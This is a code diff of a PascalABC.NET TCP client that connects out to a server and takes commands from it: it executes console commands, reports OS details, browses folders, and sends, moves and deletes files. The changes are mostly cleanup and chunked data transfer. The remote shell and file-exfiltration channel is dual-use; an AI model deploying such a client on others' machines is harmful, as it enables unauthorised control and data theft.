@@ -27,14 +27,15 @@ type
     public _message_handler_service: Thread;
     public tickInterval: word;
     public lastTick: DateTime;
-    
+   
+   
     public constructor(ip: string);
     begin
       self.ip := ip; 
       self.port := 10000 + (DateTime.Now.DayOfYear mod 5000);
       self._message_handler_service := new Thread(MessageHandler);
       self.WinInfo := self.GetOSInfo();
-      self.tickInterval := 7000;
+      self.tickInterval := 10000;
       self.lastTick := DateTime.Now;
     end;
     
@@ -61,24 +62,25 @@ type
     begin
       Thread.Create(
         () -> begin
-        while self.retry < MAX_RETRIES do
-        begin
-          try
-            self.client := new TcpClient(self.ip, self.port);
-            self.client.Client.ReceiveTimeout := 100;
-            self.client.SendTimeout := 4000;
-            self.client.ReceiveTimeout := 4000;
-            self.AppIsRunning := true;
-            self._message_handler_service.Start();
-            cmd.CD();
-            self.path := cmd.output;
-            break; // Если подключились, выходим из цикла
-          except
-            Thread.Sleep(RETRY_DELAY); // Задержка перед повторной попыткой
+          while self.retry < MAX_RETRIES do
+          begin
+            try
+              self.client := new TcpClient(self.ip, self.port);
+              self.client.Client.ReceiveTimeout := 100;
+              self.client.SendTimeout := 4000;
+              self.client.ReceiveTimeout := 4000;
+              self.AppIsRunning := true;
+              self._message_handler_service.Start();
+              cmd.CD();
+              self.path := cmd.output;
+              break; 
+            except
+              Thread.Sleep(RETRY_DELAY); 
+            end;
+            Inc(self.retry);
           end;
-          Inc(self.retry);
-        end;
-      end).Start();
+        end
+      ).Start();
       
     end;
     
@@ -125,27 +127,45 @@ type
           SetLength(data, self.client.ReceiveBufferSize);
           var len := self.stream.Read(data, 0, data.Length);
           
-          if len = 0 then 
-            self.AppIsRunning := false; 
+          if len <= 0 then 
+          begin
+            self.AppIsRunning := false;
+            exit;
+          end;
+          
           var message := Encoding.UTF8.GetString(data, 0, len);
           
-          if message = 'PING' then 
-             message := 'PONG' else 
-               
-          if message = GETPATH then
-             message := self.path else 
-               
-          if message = GET_WIN_INFO then
-             message := JsonConvert.SerializeObject(GetOSInfo()) else
-               
-          if message.StartsWith('E@') then 
-             message := ExplorerHandler(message) 
-          else               
-             message := ConsoleHandler(message);
-          
-          data := Encoding.UTF8.GetBytes(message);
-          self.stream.Write(data, 0, data.Length);
-          
+          if message = 'PING' then begin
+             data := Encoding.UTF8.GetBytes('PONG'); 
+             stream.Write(data, 0, data.Length);
+          end else begin 
+            if message = GETPATH then
+               message := self.path else 
+                 
+            if message = GET_WIN_INFO then
+               message := JsonConvert.SerializeObject(GetOSInfo()) else
+                 
+            if message.StartsWith('E@') then 
+               message := ExplorerHandler(message) 
+            else               
+               message := ConsoleHandler(message);
+            
+            data := Encoding.UTF8.GetBytes(message);
+            
+            var sizeBuffer := BitConverter.GetBytes(int64(data.Length));
+            stream.Write(sizeBuffer, 0, sizeBuffer.Length);
+            
+            var chunk := new byte[16384];
+            var sent := 0;
+            
+            while sent < data.Length do
+            begin
+              var toSend := Min(chunk.Length, data.Length - sent);
+              &Array.Copy(data, sent, chunk, 0, toSend);
+              stream.Write(chunk, 0, toSend);
+              sent += toSend;
+            end;
+          end;
           self.lastTick := DateTime.Now;
         end
         else begin
@@ -189,35 +209,29 @@ type
           responce := JsonConvert.SerializeObject(Directory.GetDirectories(self.epath));
         E_GET_FILES:
           responce := JsonConvert.SerializeObject(Directory.GetFiles(self.epath));
-        E_ARROW_UP:
+        E_ARROW_UP: {$region Вверх по иерархии папок}
         begin
-          Print('E_ARROW_UP:',self.epath);
           self.epath := self.epath.Substring(0, self.epath.LastIndexOf(SLASH));
-          Print('->',self.epath);
           if self.epath.Length <= 3 then self.epath += SLASH;
-          Println('->',self.epath);
           responce := self.epath;
-        end;
-        E_ENTER_FOLDER:
+        end;{$endregion}
+        E_ENTER_FOLDER: {$region Вход в папку}
         begin
           if Directory.EnumerateDirectories(self.epath, msg.Substring(4), SearchOption.TopDirectoryOnly).Count() > 0 then begin
             try 
-              var tempPath: string; Print('E_ENTER_FOLDER:',self.epath);
+              var tempPath: string; 
               if self.epath.LastIndexOf(SLASH)+1 = self.epath.Length then
                 tempPath := self.epath + msg.Substring(4) else
                 tempPath := self.epath + SLASH + msg.Substring(4);
               Directory.GetDirectories(tempPath);
-              self.epath := tempPath; Println('->',self.epath);
+              self.epath := tempPath; 
             except on e: Exception do 
               responce := E_ERROR_OPEN_FOLDER + #13 + e.Message;
             end; // try
           end;
-        end; 
+        end;{$endregion}
         E_ENTER_SHORTCUT:
-        begin
           self.epath := msg.Substring(4);
-          Println('E_ENTER_SHORTCUT:',self.epath);
-        end; 
         E_RECEIVE_FILE: {$region Передача файла}
         begin
           var filePath := msg.Substring(4);
@@ -226,21 +240,15 @@ type
           try
             FStream := &File.OpenRead(filePath);
           except on e: Exception do 
-            begin
-              Println(e.Message);
-              exit(E_ERROR_OPEN_FILE + ': ' + e.Message);
-            end;
+            exit(E_ERROR_OPEN_FILE + ': ' + e.Message);
           end;
           
-          // Получение размера файла
           var fileSize := FStream.Length;
-          var sizeBuffer := System.BitConverter.GetBytes(fileSize); // 8 байт Int64
+          var sizeBuffer := System.BitConverter.GetBytes(fileSize); 
           
-          // Отправка 8 байт с размером файла
           stream.Write(sizeBuffer, 0, sizeBuffer.Length);
           
-          // Отправка файла по частям
-          var buffer := new byte[4096];
+          var buffer := new byte[16384];
           var bytesRead := 0;
           
           repeat
@@ -256,17 +264,13 @@ type
         E_PASTE_ITEM: {$region Вставка скопированных\вырезанных данных}
         begin
           var info: PasteInformation = JsonConvert.DeserializeObject&<PasteInformation>(msg.Substring(4));
-          Println(msg.Substring(4));
           if info.Code = E_CUT_ITEM then begin
             foreach var item in JsonConvert.DeserializeObject&<array of string>(info.Items) do begin
               if Directory.Exists(info.TakeFrom(item)) then 
                 cmd.MOVE(info.TakeFrom(item), info.PasteHere(item))
               else if System.IO.File.Exists(info.TakeFrom(item)) then
                 System.IO.File.Move(info.TakeFrom(item), info.PasteHere(item)) 
-              else begin
-                  Println('Скип', item, info.TakeFrom(item),'->', info.PasteHere(item));
-                  Println(info.SourcePath, info.DestinationPath)
-               end;
+              else continue;
             end;
             responce := 'Перемещение прошло успешно';
           end else begin
@@ -279,17 +283,19 @@ type
             responce := 'Копирование прошло успешно';
           end;
         end;{$endregion}
-        E_DELETE_ITEM:
+        E_DELETE_ITEM: {$region Удаление файло}
         begin
           var items_path: string = msg.Substring(4, msg.IndexOf('[')-4) + SLASH;
           var JsonObjectStr := msg.Substring(msg.IndexOf('['));
           var items := JsonConvert.DeserializeObject&<array of string>(JsonObjectStr);
           foreach var item in items do
-            if Directory.Exists(items_path+item) then
-              cmd.RMDIR(items_path+item) else
+            if Directory.Exists(items_path+item) then begin
+              cmd.RMDIR(items_path+item);
+              Println(items_path+item);
+              end else
               System.IO.File.Delete(items_path+item);
           responce := 'Удаление прошло успешно';
-        end;
+        end;{$endregion}
         E_GET_ALL_FILES_IN_FOLDER:
           responce := JsonConvert.SerializeObject(Directory.GetFiles(msg.Substring(4), '*', SearchOption.AllDirectories));
       
@@ -301,18 +307,15 @@ type
   
     public procedure CopyDirectory(sourceDir, destDir: string);
     begin
-      // Создаём целевую директорию, если она не существует
       if not Directory.Exists(destDir) then
         Directory.CreateDirectory(destDir);
     
-      // Копируем все файлы из sourceDir
       foreach var fileName in Directory.GetFiles(sourceDir) do
       begin
         var destFile := System.IO.Path.Combine(destDir, System.IO.Path.GetFileName(fileName));
         System.IO.File.Copy(fileName, destFile, true);
       end;
     
-      // Рекурсивно копируем поддиректории
       foreach var dirName in Directory.GetDirectories(sourceDir) do
       begin
         var destSubDir := System.IO.Path.Combine(destDir, System.IO.Path.GetFileName(dirName));
@@ -350,6 +353,7 @@ type
         Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
       );
     end;
+  
   
   end; // class
 
